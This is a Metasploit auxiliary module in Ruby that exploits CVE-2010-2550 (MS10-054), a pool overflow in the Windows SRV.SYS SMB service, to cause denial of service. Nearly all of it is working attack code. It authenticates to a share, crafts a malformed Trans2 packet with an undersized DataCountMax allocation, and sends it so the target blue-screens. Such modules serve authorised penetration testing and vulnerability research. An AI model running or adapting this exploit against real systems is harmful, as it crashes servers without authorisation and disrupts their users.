##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS',
      'Description'    => %q{
          This module exploits a denial of service flaw in the Microsoft
        Windows SMB service on versions of Windows prior to the August 2010 Patch
        Tuesday. To trigger this bug, you must be able to access a share with
        at least read privileges. That generally means you will need authentication.
        However, if a system has a guest accessible share, you can trigger it
        without any authentication.
      },
      'References'     =>
        [
          ['CVE', '2010-2550'],
          ['OSVDB', '66974'],
          ['MSB', 'MS10-054'],
          ['URL', 'http://seclists.org/fulldisclosure/2010/Aug/122']
        ],
      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'jduck' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(445),
        OptString.new('SMBSHARE', [ true, "The name of a readable share on the server" ])
      ], self.class)
  end

  # Perform a transaction2 request using the specified subcommand, parameters, and data
  def malformed_trans2(subcommand, param = '', body = '')

    # values < 0xc (not inclusive) causes a crash
    alloc_sz = rand(0x0c)

    setup_count = 1
    setup_data = [subcommand].pack('v')

    data = param + body

    pkt = CONST::SMB_TRANS2_PKT.make_struct
    simple.client.smb_defaults(pkt['Payload']['SMB'])

    base_offset = pkt.to_s.length + (setup_count * 2) - 4
    param_offset = base_offset
    data_offset = param_offset + param.length

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
    pkt['Payload']['SMB'].v['Flags1'] = 0x0
    pkt['Payload']['SMB'].v['Flags2'] = 0xc801
    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count

    pkt['Payload'].v['ParamCountTotal'] = param.length
    pkt['Payload'].v['DataCountTotal'] = body.length
    pkt['Payload'].v['ParamCountMax'] = 0

    # this value becomes the allocation size
    pkt['Payload'].v['DataCountMax'] = alloc_sz

    pkt['Payload'].v['ParamCount'] = param.length
    pkt['Payload'].v['ParamOffset'] = param_offset + 3
    pkt['Payload'].v['DataCount'] = body.length
    pkt['Payload'].v['DataOffset'] = data_offset + 3
    pkt['Payload'].v['SetupCount'] = setup_count
    pkt['Payload'].v['SetupData'] = setup_data

    pkt['Payload'].v['Payload'] = "\x00\x44\x20" + data

    exploit = pkt.to_s
    exploit[data_offset,2] = [5].pack('v')

    #print_status("\n" + Rex::Text.to_hex_dump(exploit))

    simple.client.smb_send(exploit)

    # no waiting for recv :)
  end


  def run

    connect()

    simple.login(
      datastore['SMBName'],
      datastore['SMBUser'],
      datastore['SMBPass'],
      datastore['SMBDomain']
    )
    simple.connect("\\\\#{datastore['RHOST']}\\#{datastore['SMBSHARE']}")

    print_status("Sending malformed trans2 request..")
    params = [
      "\x05\x01",  # Query FS Attribute Info (0x0105)
      "\x02\x01"   # Query FS Volume Info (0x0102)
    ]
    idx = rand(params.length)
    malformed_trans2(0x03, params[idx])

    print_status("The target should encounter a blue screen error now.")
    select(nil, nil, nil, 0.5)

  end

end
